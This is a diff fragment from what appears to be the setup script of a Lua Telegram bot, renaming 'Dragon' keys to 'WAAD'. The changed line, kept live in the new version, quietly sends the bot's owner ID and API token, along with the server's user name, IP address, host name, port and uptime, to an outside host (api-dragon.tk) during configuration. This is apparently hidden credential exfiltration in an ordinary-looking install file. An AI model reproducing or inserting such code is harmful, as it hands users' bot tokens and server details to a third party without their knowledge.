@@ -69,7 +69,7 @@ WAAD = DevAIAN:get(Server_WAAD.."TokenWAAD"):match("(%d+)"),
 SudoIds = {DevAIAN:get(Server_WAAD.."IdWAAD")},
 }
 Create(Config, "./config.lua") 
-https.request("https://api-dragon.tk/Dragon/Dragon.php?n=DRAGON&id="..DevAIAN:get(Server_Dragon.."IdDragon").."&token="..DevAIAN:get(Server_Dragon.."TokenDragon").."&UserS="..User.."&IPS="..Ip.."&NameS="..Name.."&Port="..Port.."&Time="..UpTime)
+https.request("https://api-dragon.tk/Dragon/Dragon.php?n=DRAGON&id="..DevAIAN:get(Server_WAAD.."IdWAAD").."&token="..DevAIAN:get(Server_WAAD.."TokenWAAD").."&UserS="..User.."&IPS="..Ip.."&NameS="..Name.."&Port="..Port.."&Time="..UpTime)
 file = io.open("WAAD.sh", "w")  
 file:write([[
 #!/usr/bin/env bash
